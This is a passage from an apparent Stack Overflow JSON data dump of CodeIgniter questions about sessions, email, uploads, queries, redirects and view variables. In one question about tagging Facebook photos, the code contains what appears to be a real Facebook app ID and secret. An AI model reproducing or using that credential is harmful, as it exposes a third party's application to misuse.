CodeIgniter. I tried with the option in configuration.</p>\n\n<pre><code>$_configure['_encoding']=\"base64\";\n$email= new Email($config);    \n</code></pre>\n\n<p>But it doesn't work. How can set the header like above in CodeIgniter?</p>\n\n<p><strong>Edit:</strong></p>\n\n<p>Currently using CodeIgniter Email class only.</p>\n"},{"tags":["php","codeigniter","activerecord","count"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":13129294,"title":"Codeigniter: how do I select count when `$query->num_rows()` doesn't work for me?","body":"<p>I have a query which is returning a sum, so naturally it returns <em><strong>one</strong></em> row.<br>\nI need to count the number of records in the DB which made that sum.</p>\n\n<p>Here's a sample of the type of query I am talking about (MySQL):</p>\n\n<pre><code>SELECT \n    i.id, \n    i.vendor_quote_id, \n    i.product_id_requested, \n    SUM(i.quantity_on_hand) AS qty, \n    COUNT(i.quantity_on_hand) AS count\nFROM vendor_quote_item AS i\nJOIN vendor_quote_container AS c \n    ON i.vendor_quote_id = c.id\nLEFT JOIN company_types ON company_types.company_id = c.company_id\nWHERE company_types.company_type =  'f'\nAND i.product_id_requested =  12345678\n</code></pre>\n\n<p>I have found and am now using the select_min(), select_max(), and select_sum() functions, but my <em>COUNT()</em> is still hard-coded in.</p>\n\n<p>The <em><strong>main</strong></em> problem is that I am having to specify the table name in a <em>tightly</em> coupled manner with something like <code>$this-&gt;$db-&gt;select( 'COUNT(myDbPrefix_vendor_quote_item.quantity_on_hand) AS count' )</code> which kills portability and makes switching environments a PIA.</p>\n\n<p>How can/should I get my the count values I am after with CI in an uncoupled way??</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2803,"score":1,"question_id":5714823,"title":"CodeIgniter and autoloading the database library","body":"<p>I've got an issue connecting to the database with CodeIgniter.</p>\n\n<p>In the model, if I do</p>\n\n<pre><code>$this-&gt;load-&gt;database();\n</code></pre>\n\n<p>then a query such as</p>\n\n<pre><code>$query = $this-&gt;db-&gt;get('articles', 10);\n</code></pre>\n\n<p>works and returns data. However, when I remove the load->database line and try autoloading the database library, using</p>\n\n<pre><code>$autoload['libraries'] = array('database');\n</code></pre>\n\n<p>in application/config/autoload.php, the above query fails. As it works when I explicitly load the library, it's not a problem with my database connection. I'm using CodeIgniter 2.0.2 (the current latest release).</p>\n\n<p>As most of my pages use the database I'd like to autoload it to avoid having to load it anually in each model. Have I misunderstood the documentation regarding loading the database library or am I doing something wrong?</p>\n"}]}
{"total":13987,"page":3,"pagesize":100,"questions":[{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":409,"score":0,"question_id":3724520,"title":"what is db_clean in codeigniter?","body":"<p>What is the use of <strong>db_clean()</strong> with a simple example?</p>\n"},{"tags":["php","codeigniter","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13174297,"title":"How to destroy session with browser closing in codeigniter","body":"<p>Recently I have developed a web application with codeigniter. I am facing a session related problem there badly.</p>\n\n<p><strong>Problem scenario:</strong> </p>\n\n<p>If user A logged into the application then the user id set in session. After doing task user A closed his browser and leave the computer. A little while later user B came and open browser and see the application was in logged in state. or when user B write down the url and press enter it directly redirected into the application without any authentication by using the previous session.</p>\n\n<p>I used the following configuration for session:</p>\n\n<pre><code>$config['sess_cookie_name']     = 'ci_session';\n$config['sess_expiration']      = 1800;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = FALSE;\n$config['sess_table_name']      = 'ci_sessions';\n$config['sess_match_ip']        = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 300;\n</code></pre>\n\n<p>Now my question is how can i destroy all the session with closing browser or browser tab in codeigniter? </p>\n"},{"tags":["php","codeigniter","activerecord","business-logic"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13178682,"title":"How can I use business objects to wrap logic in Codeigniter?","body":"<p>I have been using Codeigniter for a while, and I would like to have business objects that handle the logic, something like this:</p>\n\n<pre><code>$comment = new Comment($this-&gt;input-&gt;post());\n$blog = new Blog();\n$current_post = $blog-&gt;get_current_post();\n$current_post-&gt;add_comment($comment);\n\n$data['current_post'] = $current_post;\n$this-&gt;load-&gt;view('post_view',$data);\n</code></pre>\n\n<p>Instead of this approach:</p>\n\n<pre><code>$this-&gt;load-&gt;model('comment_model');\n$this-&gt;load-&gt;model('blog_model');\n$this-&gt;load-&gt;model('post_model');\n\n$comment = $this-&gt;comment_model-&gt;create_from_array($this-&gt;input-&gt;post());\n$blog = $this-&gt;blog_model-&gt;get_blog();\n$current_post = $this-&gt;post_model-&gt;get_current_post($blog);\n$this-&gt;post_model-&gt;add_comment($current_post,$comment);\n\n$data['current_post'] = $current_post;\n$this-&gt;load-&gt;view('post_view',$data);\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13179393,"title":"Best way to create a large dynamic query in Codeigniter?","body":"<p>The scenario is a reporting application. To date, MVC applications I've worked with typically have model methods that respond to one specific question (i.e <code>get_username_from_id($id)</code>). What I'm looking to do is have one query that can respond many different ways depending on checkboxes selected. </p>\n\n<p>So - for example, I may have a query with just one thing in the select or it may have 100 things in the select. The way I've done it, it's gotten messy fast. For example, I wind up doing things like this:</p>\n\n<pre><code>if(in_array(\"id\", $grain)){\n    $sql .= \"table.id id, \";\n}\n</code></pre>\n\n<p>Is there a best practice for this kind of thing? Or even a way to handle the group by so there isn't a bunch more extra code? I know this is kind of open ended, and I'm probably not even phrasing my question correctly. Much appreciation even to folks who can chime in and help me ask the right question.</p>\n"},{"tags":["php","javascript","html","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":33,"score":-4,"question_id":13197458,"title":"How can i have my php page read the values posted by a pop out page","body":"<p>i wanted to know how can i get the values posted by a pop out page to its parent page. I am using codeigniter for my web application. Any help would be greatly appreciated!</p>\n"},{"tags":["php","codeigniter","url","views"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13196474,"title":"codeigniter site_url 404 page not found","body":"<p>I'm using CodeIgniter in localhost (MAMP) starting with the project example given with CodeIgniter itself. I want to load a view from welcome_message.php, so first of all in welcome Controller I've written</p>\n\n<pre><code>public function index()\n{\n    $this-&gt;load-&gt;helper('url');\n\n    $this-&gt;load-&gt;view('welcome_message');\n}\n</code></pre>\n\n<p>then I've create the new view with a simple text. In welcome_message.php I've put</p>\n\n<pre><code>&lt;a href=\"&lt;?php echo site_url('test');?&gt;\"&gt;Test&lt;/a&gt;\n</code></pre>\n\n<p>(both the views are in views folder)</p>\n\n<p>When I open welcome_message.php in my browser I see the link but when I click on it Test.php is not loaded. I read only</p>\n\n<p><strong>404 Page Not Found\nThe page you requested was not found.</strong></p>\n\n<p>In other project that I've seen on the web this works without problems, I don't know how can I fix it.</p>\n"},{"tags":["php","codeigniter","rest"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":632,"score":2,"question_id":10758100,"title":"How to create an API-centric application (more specifically: for HMVC in CodeIgniter)","body":"<h3>Background:</h3>\n\n<p>I am working on a web application, that I plan to launch with iPhone and Android versions in the near future, and I have some questions about developing an API for use by the different front-ends.</p>\n\n<h3>I Started with This:</h3>\n\n<p>I was reading <a href=\"http://net.tutsplus.com/tutorials/php/creating-an-api-centric-web-application/comment-page-1\" rel=\"nofollow\">this TutsPlus tutorial</a>, which talks about creating an API-centric web application, meaning that all of your browser calls and smartphone app calls are routed through the API.  </p>\n\n<p>What especially got me excited, was this statement in the tutorial from Twitter:</p>\n\n<blockquote>\n  <p>One of the most important architectural changes is that Twitter.com is now a client of our own API. It fetches data from the same endpoints that the mobile site, our apps for iPhone, iPad, Android, and every third-party application use.</p>\n</blockquote>\n\n<p>The above statement reflects, what I would ideally like to create.</p>\n\n<h3>Then I Saw This:</h3>\n\n<p>I found <a href=\"http://net.tutsplus.com/tutorials/php/working-with-restful-services-in-codeigniter-2\" rel=\"nofollow\">this TutsPlus tutorial</a>, which talks about, how to build a REST API for CodeIgniter.  This was good, because I am developing my application in CodeIgniter, using the <a href=\"http://codeigniter.com/wiki/Modular_Extensions_-_HMVC/\" rel=\"nofollow\">Modular Extensions plugin - HMVC</a>, and I thought it would be perfect for my purposes.</p>\n\n<p>The only thing, that I'm somewhat lost in, is the way <a href=\"http://stackoverflow.com/users/124378/phil-sturgeon\">Phil Sturgeon</a> seems to <a href=\"http://philsturgeon.co.uk/blog/2009/06/REST-implementation-for-CodeIgniter\" rel=\"nofollow\">suggest</a> to create the API.  He suggests to have all of your front-end code modules completed and then create an API for each of the modules in their respective directories (not necessarily in that order).  This would be fine if I didn't want it to be API-centric.</p>\n\n<h2>And I Want to Know How to Do This:</h2>\n\n<p>How should I proceed to get a blend of both tutorials:</p>\n\n<ul>\n<li>API-centric application that can be used by a browser application as well as separate mobile applications</li>\n<li>REST API for CodeIgniter (with HMVC modules)</li>\n</ul>\n\n<p>Should I:</p>\n\n<ul>\n<li>Just follow the API-centric tutorial and try to tailor it to my needs?</li>\n<li>Follow the CodeIgniter-specific tutorial and use Phil Sturgeon's advice for how to implement it with HVMC?</li>\n<li>A combination of both?</li>\n<li>Neither?</li>\n</ul>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":400,"score":0,"question_id":1858194,"title":"Using an flash MP3 player (any one) on Codeigniter?","body":"<p>Can someone teach me how to embed a flash MP3 player (step-by-step) using codeigniter?  I have been trying for hours now with no success.  I am so frustrated.  Someone please help me.  Thanks.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13193714,"title":"codeignter with multi databaes stored on database","body":"<p>i’m working on 20 websites and each one has his own database, but they have the same structure of database.\nthe problem is that i have to login to the different back-end to do some work on them.\nSo i decided to write single CI back-end for all the websites.</p>\n\n<p>for that i created a database with two tables on ( user , websites )</p>\n\n<p>the user table is for login action.</p>\n\n<p>the websites table list all websites and the associated database.</p>\n\n<p>what i like to do is in any view of my backend application , i’ll be able to select the database(or website) so the current view be reloaded with data from the selected database to perform some work on it and then submit it.</p>\n\n<p>i’m using CI V1.7.2</p>\n\n<p>any one can help me ? please</p>\n"},{"tags":["codeigniter","session","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13184304,"title":"Codeigniter flashdata not working in internet explorer and google chrome","body":"<p>Codeigniter flashdata not working in internet explorer and chrome but it is working on firefox.What could be the issue?.</p>\n\n<p>In My controller:-</p>\n\n<pre><code>$this-&gt;session-&gt;set_flashdata('login_error','Your username or password is incorrect.');\nredirect(base_url().'admin/login');\n</code></pre>\n\n<p>In My view </p>\n\n<pre><code>echo  '&lt;span&gt;'.$this-&gt;session-&gt;flashdata('login_error').'&lt;/span&gt;';\n</code></pre>\n\n<p>In Chrome and ie i'm getting blank span whereas in firefox it is displaying flash data.</p>\n\n<p>There are similar questions on the stack but i could not find any answer which are working.</p>\n"},{"tags":["php","codeigniter","email","sendgrid"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13194618,"title":"Sending mail to multiple recipients with sendgrid and codeigniter","body":"<p>I recently signed up for SendGrid and took a look at their integration into CodeIgniter. </p>\n\n<p>They recommend doing the following to send mail out:</p>\n\n<pre><code> $this-&gt;email-&gt;initialize(array(\n      'protocol' =&gt; 'smtp',\n      'smtp_host' =&gt; 'smtp.sendgrid.net',\n      'smtp_user' =&gt; 'sendgridusername',\n      'smtp_pass' =&gt; 'sendgridpassword',\n      'smtp_port' =&gt; 587,\n      'crlf' =&gt; \"\\r\\n\",\n      'newline' =&gt; \"\\r\\n\"\n    ));\n\n    $this-&gt;email-&gt;from('your@example.com', 'Your Name');\n    $this-&gt;email-&gt;to('someone@example.com');\n    $this-&gt;email-&gt;cc('another@another-example.com');\n    $this-&gt;email-&gt;bcc('them@their-example.com');\n    $this-&gt;email-&gt;subject('Email Test');\n    $this-&gt;email-&gt;message('Testing the email class.');\n    $this-&gt;email-&gt;send();\n\n    echo $this-&gt;email-&gt;print_debugger();\n</code></pre>\n\n<p>This seems like a nice solution for sending out emails to single individuals but what if I have an email that I want to send to a whole bunch of people? Is it possible to send either the \"to\" or the \"bcc\" in as an array? </p>\n\n<p>Is there a different integration method preferred for using SendGrid with CI? </p>\n\n<p>Thanks!</p>\n"},{"tags":["php","codeigniter","date"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":13190383,"title":"PHP date comparison to find birthdays that are before timstamp date 1970?","body":"<p>I have created function to generate list of members having birthday 1 week before, today and week after. The function is</p>\n\n<pre><code>$m= date(\"m\"); // Month value\n        $de= date(\"d\"); //today's date\n        $y= date(\"Y\"); // Year value\n\nfor($i=0;$i&lt;count($members);$i++){\n            $m_bday = strtotime($members[$i]-&gt;dob);\n            $bday_date = date('d',$m_bday);\n            $bday_month = date('m',$m_bday);\n            $bday = strtotime(date('Y-m-d',mktime(0,0,0,$bday_month,$bday_date,$y)));\n            //echo $bday_date.\"&lt;/br&gt;\".$bday_month.\"&lt;/br&gt;\".$members[$i]-&gt;dob.\"&lt;/br&gt;\".date('Y-m-d',$bday);exit;\n            $week_before = strtotime(date('Y-m-d', mktime(0,0,0,$m,($de-7),$y)));\n            $week_after = strtotime(date('Y-m-d', mktime(0,0,0,$m,($de+7),$y)));\n\n            if(date('d-m') == date('d-m',$bday)){\n                $this-&gt;present_bday[] = array('mem_name'=&gt; $members[$i]-&gt;name);\n            }\n            else if(date('d-m',$week_before) &lt;= date('d-m',$bday) &amp;&amp; date('d-m',$bday) &lt; date('d-m')){\n                $this-&gt;past_bday[] = array('mem_name' =&gt; $members[$i]-&gt;name);\n            }\n            else if(date('d-m')&lt; date('d-m',$bday) &amp;&amp; date('d-m',$bday) &lt;= date('d-m',$week_after)){\n                $this-&gt;future_bday[] = array('mem_name' =&gt; $members[$i]-&gt;name);\n            }\n        }\n</code></pre>\n\n<p>The date format returned from db is <code>yyyy-mm-dd</code> i.e <code>1960-06-12</code> \nthe problem is this code works fine for 1 week before and today but 1 week after returning if the year is below 1970 and 1 week after condition completely fails.</p>\n\n<p>Can anyone provide me with proper date manipulation for these results please?</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13192136,"title":"Catch url in CodeIgniter","body":"<p>I am getting url like <strong>http://localhost/webpt/ipn/checkout/?token=EC-2YD51592ET0280122&amp;PayerID=VNH3J2KQEK8AS</strong> and want to catach in my controller. in my controller code </p>\n\n<pre><code>function checkout($token = array()) {\n        echo\"&lt;pre&gt;\";\n        print_r($token);\n        echo\"&lt;/pre&gt;\";\n    }\n</code></pre>\n\n<p>but it show empty array.</p>\n"},{"tags":["php","mysql","codeigniter","datetime"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13115130,"title":"Pull records from orders table for the current week","body":"<p>I have a table with the following info...</p>\n\n<pre><code>Id | orderNumber | orderDate | customerId\n</code></pre>\n\n<p><code>orderDate</code> is a MySQL datetime field and the current day, month, year and time is inserted into the database at the time the record is written.</p>\n\n<p>So my question is how would I pull a list of orders for a certain day of this current week. My goal is to use the google charts API to make a chart for <strong>\"This Week's Sales\"</strong> that says something like:</p>\n\n<pre><code> var data = google.visualization.arrayToDataTable([\n                      ['Day', 'Sales'],\n                      ['Mon',  1],\n                      ['Tue',  0],\n                      ['Wed',  4],\n                      ['Thurs',  3],\n                      ['Fri',  0],\n                    ]);\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13190835,"title":"codeigniter whitespace or header causing warning","body":"<p>I have been getting a warning error all day yesterday and can't get it off. Don't know what is happening. it is complaining that some output was sent before execution of a redirect on property_model.php on line 1. I went there and checked for everything but no luck. I also checked for whitespaces. I am going to paste down the error and code.</p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: Warning</p>\n  \n  <p>Message: Cannot modify header information - headers already sent by\n  (output started at\n  /home/sddhd/public_html/rsw/application/models/property_model.php:1)</p>\n  \n  <p>Filename: helpers/url_helper.php</p>\n  \n  <p>Line Number: 542</p>\n</blockquote>\n\n<p>Now the code of model it shows above is:</p>\n\n<pre><code>&lt;? class Property_model extends CI_Model {\n    function __construct()\n        {\n            parent::__construct();\n        }\n\n        function insert_property($propertyID)\n        {\n            $this-&gt;property_id = $propertyID;\n            $this-&gt;type = $_POST['property_type'];\n            $this-&gt;city = $_POST['property_city'];\n            $this-&gt;address = $_POST['property_address'];\n            $this-&gt;description = $_POST['property_description'];\n            $this-&gt;owner = $_POST['property_owner'];\n            $this-&gt;date_added = date(\"Y-m-d\");\n            $this-&gt;price = $_POST['property_price'];\n            $this-&gt;offer_type = $_POST['property_offer'];\n            $this-&gt;contact = $_POST['property_contact'];\n            $this-&gt;db-&gt;insert('property', $this);\n        }\n\n        function insert_image_details($id, $url, $extension)\n        {\n            $current-&gt;property_id = $id;\n            $current-&gt;extension = $extension;\n            $current-&gt;url = $url;\n            $this-&gt;db-&gt;insert('photos', $current);\n        }\n    }\n?&gt;\n</code></pre>\n\n<p>and the uses of the redirect call (including whole controller call making calls to the model): </p>\n\n<pre><code>&lt;?php\nclass Property extends CI_Controller {\n    public function __construct()\n    {\n        parent::__construct();\n        $this-&gt;load-&gt;helper('form');\n                $this-&gt;load-&gt;helper('url');\n        $this-&gt;load-&gt;model('property_model', 'propertymodel');\n        $this-&gt;load-&gt;database();\n    }\n\n    public function index() {\n        $this-&gt;load-&gt;view('home');\n    }\n\n    public function new_property()\n    {\n        $this-&gt;load-&gt;view('new_property', array('error' =&gt; '' ));    \n    }\n\n    public function create_property()\n    {\n        //Pass the posted data to model for insertion\n        $propertyID = uniqid();\n        $this-&gt;propertymodel-&gt;insert_property($propertyID); \n        $this-&gt;do_upload($propertyID);\n        redirect('/home');\n    }\n\n\n        public function do_upload($propertyId)\n        {\n            $config['upload_path'] = './uploads/';\n            $config['allowed_types'] = 'gif|jpg|png|jpeg';\n            $config['max_size'] = '1000';\n            $config['max_width']  = '1024';\n            $config['max_height']  = '768';\n\n            $this-&gt;load-&gt;library('upload', $config);\n                if ( ! $this-&gt;upload-&gt;do_upload())\n                {\n                    $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n                    $this-&gt;load-&gt;view('create_property', $error);\n                }\n                else\n                {\n                    $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n                    //array to access all the file uploaded attributes\n                    $image_data = $this-&gt;upload-&gt;data();\n\n                    //parameters to be passed to model: \n                    $imgUrl = \"../.\".$config['upload_path'].$image_data['file_name'];\n                    //$imgTitle = $image_data['file_name'];\n                    $fileExtension = $image_data['file_ext'];\n                    $this-&gt;propertymodel-&gt;insert_image_details($propertyId, $imgUrl, $fileExtension);\n                }           \n        }//end of function\n\n\n}\n?&gt;\n</code></pre>\n\n<p>Any help would be greatly appreciated</p>\n"},{"tags":["codeigniter","logging"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":13191837,"title":"Error Handling in CI","body":"<p>I read <a href=\"http://codeigniter.com/user_guide/general/errors.html\" rel=\"nofollow\">Error Handling</a> but if I use <code>log_message('debug', 'Hi I m in Cart Controller');</code> or <code>log_message('info', 'Hi I m in Cart Controller');</code> it does not log any message but work only for <code>log_message('error', 'Hi I m in Cart Controller');</code></p>\n\n<p>Any idea what my mistake is?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":13174101,"title":"Codeigniter something wrong with template and including views","body":"<p>Maybe you can not help me, but maybe you have some ideas where to try to find the problem. I have Template page what looks like this:</p>\n\n<p>dve_kolone.php</p>\n\n<pre><code>&lt;?php $this-&gt;load-&gt;view('frontend/inc/header'); ?&gt;\n&lt;?php $this-&gt;load-&gt;view('frontend/inc/logo'); ?&gt;\n\n&lt;?php if(empty($pretraga_prikaz)) {\n    $this-&gt;load-&gt;view('frontend/inc/pretraga');\n}\n?&gt;\n    &lt;div id=\"main_content\"&gt; \n        &lt;div class=\"sprite\" id=\"main_content_header\"&gt; \n            &lt;div class=\"kolacici belit\"&gt; &lt;?php if(!empty($kolacici)) { echo $kolacici;}?&gt; &lt;/div&gt;\n            &lt;div id=\"main_brojac_gore\" class=\"f20 bold belit ml200\"   style=\"position:relative;\"&gt;&lt;h1&gt;&lt;?php if(!empty($naslov)) { echo $naslov;}?&gt;\n\n            &lt;/h1&gt;&lt;?php if(!empty($oglas_izmene)) { echo $oglas_izmene;} ?&gt;&lt;/div&gt;    \n\n\n        &lt;/div&gt;\n        &lt;div id=\"mainov\" class=\"dve_kolone\"&gt;        \n        &lt;div id=\"main_levo\"&gt;\n            &lt;?php \n            if(!empty($levo)) {\n                $this-&gt;load-&gt;view($levo);\n            } else {\n                $this-&gt;load-&gt;view('frontend/inc/levo_standard');\n            } ?&gt;\n        &lt;/div&gt;\n        &lt;div id=\"main_sredina_full\" class=\"&lt;?if(!empty($klasa)){ echo $klasa;}?&gt;\"&gt;\n\n&lt;?php \nif(!empty($partial)) {\n    $this-&gt;load-&gt;view($partial);\n} else {\n    redirect(base_url());\n} ?&gt;\n&lt;br class=\"cl\"/&gt;\n&lt;/div&gt;\n&lt;br class=\"cl\"/&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n\n&lt;?php $this-&gt;load-&gt;view('frontend/inc/footer'); ?&gt;\n</code></pre>\n\n<p>In controller I am sending two views and the title to this. In view is the simple word:</p>\n\n<pre><code>function nesto()\n{\n    $data['naslov'] = 'Kursna lista';\n    $data['partial'] = 'proba';\n    $this-&gt;load-&gt;view('frontend/dve_kolone', $data);\n}\n</code></pre>\n\n<p>In live its look slike this: <a href=\"http://www.svastara.rs/anketa/nesto\" rel=\"nofollow\">http://www.svastara.rs/anketa/nesto</a></p>\n\n<p>And now I will show you another page in live where it looks perfect: <a href=\"http://www.svastara.rs/kursna_lista/eur\" rel=\"nofollow\">http://www.svastara.rs/kursna_lista/eur</a></p>\n\n<p>So my problem is you will see that there is missing at first link one menu in footer with red line.\nI do not understand why, because on other pages where is used this template, on lot of times there is no css used just simple stuff included. And now I put a simple stuff, but the page is not fitting height to page or to text, it is too much big. And I do not made changes on any CSS:S</p>\n\n<p>I hope you have some ideas</p>\n\n<p>FOOTER non working part:</p>\n\n<pre><code>&lt;div id=\"footer\" class=\"sprite\"&gt;\n    &lt;div class=\"footer_nav fl\"&gt;\n        &lt;ul class=\"navig\"&gt;\n\n            &lt;li&gt;&lt;a href=\"&lt;?=base_url()?&gt;info/predaja_oglasa\"&gt;PREDAJA OGLASA&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"&lt;?=base_url()?&gt;info/reklamiranje\"&gt;REKLAMIRANJE&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"&lt;?=base_url()?&gt;horoskop\"&gt;HOROSKOP&lt;/a&gt;&lt;/li&gt;\n            &lt;li class=\"nbr\"&gt;&lt;a href=\"info/kontakt\"&gt;KONTAKT&lt;/a&gt;&lt;/li&gt;\n            &lt;ul&gt;\n    &lt;/div&gt;\n    &lt;div id=\"footer_social\"&gt;\n\n        &lt;a href=\"http://www.youtube.com/\"&gt;&lt;img src=\"&lt;?=slika()?&gt;\" class=\"sprite youtube fl hop\"/&gt;&lt;/a&gt;\n        &lt;a href=\"http://www.twitter.com/v_svastara\"&gt;&lt;img src=\"&lt;?=slika()?&gt;\" class=\"sprite twitter fl hop\"/&gt;&lt;/a&gt;\n        &lt;a href=\"http://facebook.com/Vojvodjanska.Svastara\"&gt;&lt;img src=\"&lt;?=slika()?&gt;\" class=\"sprite facebook fl hop\"/&gt;&lt;/a&gt;\n    &lt;/div&gt;\n\n    &lt;br class=\"cl\"/&gt;\n</code></pre>\n"},{"tags":["codeigniter","facebook-graph-api","facebook-connect","facebook-php-sdk","codeigniter-2"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":611,"score":1,"question_id":8851960,"title":"Tag friends in photo using graph api","body":"<p>I want to tag user's friends into the photo which is uploaded by user from my application....anyone please help me in that...i will be very thank full....i m using codeigniter as a framework....\ni already created an photo album in user's profile and uploaded that photo into that but now i want to tag his friends fetched from his friend list...</p>\n\n<p>this is the code i used for creating the album and uploading the photo =></p>\n\n<pre><code>$fb_config = array(\n            'appId'  =&gt; '148056051963323',\n            'secret' =&gt; '0cebf087b3084e5a772b6c31acb2736a'  \n        );\n\n        $this-&gt;load-&gt;library('facebook', $fb_config);\n        $this-&gt;facebook-&gt;setFileUploadSupport(true);\n        $album_details = array(\n            'message'=&gt; 'For more LoL images check out -&gt; http://lolsharing.com/',\n            'name'=&gt; 'LoL Sharing'\n        );\n        $album_exist_check = $this-&gt;common_model-&gt;check_album($_SESSION['user_fb_id']);\n        if($album_exist_check['album_id']==0)\n        {\n            $create_album = $this-&gt;facebook-&gt;api('/me/albums', 'post', $album_details);\n            $insert_ablum = $this-&gt;common_model-&gt;insert_ablum($_SESSION['user_fb_id'], $create_album['id']);\n\n        }\n        else\n        {\n            $create_album['id'] = $album_exist_check['album_id'];\n        }\n        $photo_details = array(\n            'message'=&gt; ''.$image_name['image_caption'].' for more LoL Images check out - http://lolsharing.com/'\n        );\n        $photo_details['image'] = '@' . realpath(''.FCPATH.'assets/joke_images/'.$image_name['image_name'].'');\n        $upload_photo = $this-&gt;facebook-&gt;api('/'.$create_album['id'].'/photos', 'post', $photo_details);\n        if($upload_photo)\n        {\n            $this-&gt;common_model-&gt;user_point_counter($image_id);\n            $this-&gt;common_model-&gt;user_self_point_counter();\n            if($upload_photo)\n            {\n                //redirect(''.$_SESSION['return_url'].'');\n                echo \"&lt;div class='button1'&gt;Image Shared.&lt;/div&gt;\";\n                echo '&lt;div class=\"num_share\"&gt;\n                        &amp;nbsp;&amp;nbsp; Total Shares &lt;br /&gt;\n                        &lt;span&gt;&amp;nbsp; '.$image_name['shares'].'&lt;/span&gt;\n                        &lt;/div&gt;';\n            }\n        }\n</code></pre>\n\n<p>please help me..thanks in advance</p>\n"},{"tags":["jquery","codeigniter","file-upload","blueimp"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":234,"score":-1,"question_id":12303660,"title":"Restricting file types in JQuery File upload demo","body":"<p>I am using <a href=\"http://blueimp.github.com/jQuery-File-Upload/\" rel=\"nofollow\">JQuery file upload demo</a> for my next project with Codeigniter. Can anyone tell me how do I achieve the following : </p>\n\n<ul>\n<li>Restricting upload file types to .zip and .rar</li>\n<li>Restricting file size</li>\n<li>Clearing the list of Uploaded files (JQuery file upload plugin displays the list of already uploaded files)</li>\n</ul>\n\n<p>Help appreciated !!</p>\n"},{"tags":["php","codeigniter","sql-update"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":13189903,"title":"Codeigniter controller model call fail","body":"<p>I am new to CI and I want to update some data in mysql . So here is my controller </p>\n\n<pre><code>class Ci_update extends CI_Controller\n{\n    function __construct() {\n        parent::__construct();\n    }\n\n    function index()\n    {\n        $data = array\n        (\n          'title' =&gt; 'Data Structure using C',  \n          'text' =&gt; 'Data Structure Using C, for, IIIrd Sem VTU CSE students'\n        );\n        $id = 4 ;\n\n        $this-&gt;load-&gt;model('ci_update_model');\n        $this-&gt;ci_update_model($data,$id);\n    }\n}\n</code></pre>\n\n<p>and my model is :</p>\n\n<pre><code>class Ci_update_model extends CI_Model\n{\n    function __construct() {\n        parent::__construct();\n    }\n\n    function updateData($data,$id)\n    {\n        $this-&gt;db-&gt;where('id',$id);\n        $this-&gt;db-&gt;update('data',$data);\n    }\n}\n</code></pre>\n\n<p>But when I tried to run the program , it says <code>Call to undefined method Ci_update::ci_update_model() in C:\\wamp\\www\\ci\\application\\controllers\\ci_update.php on line 19</code>\nWhat wrom am I doing?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13176796,"title":"Undefined variable in view page","body":"<p>I can't passing the variables in view page</p>\n\n<p>this is my controller code</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Management extends CI_Controller {\n\n        public function __construct()\n       {\n            parent::__construct();\n            if($this-&gt;session-&gt;userdata('level') != 1){\n                redirect('');\n            } \n        }\n\n\n        public function hotels()\n        {   \n\n                $this-&gt;load-&gt;model('model_hotels');\n\n                $ss['most_view_hotels'] = '23';\n                $this-&gt;load-&gt;view(\"management/header_mng_view\");\n                $this-&gt;load-&gt;view('management/hotels_mng_view' , $ss , true);\n                $this-&gt;load-&gt;view(\"management/footer_mng_view\");\n        }\n\n}\n</code></pre>\n\n<p>this is the error</p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: Notice</p>\n  \n  <p>Message: Undefined variable: most_view_hotels</p>\n  \n  <p>Filename: management/hotels_mng_view.php</p>\n  \n  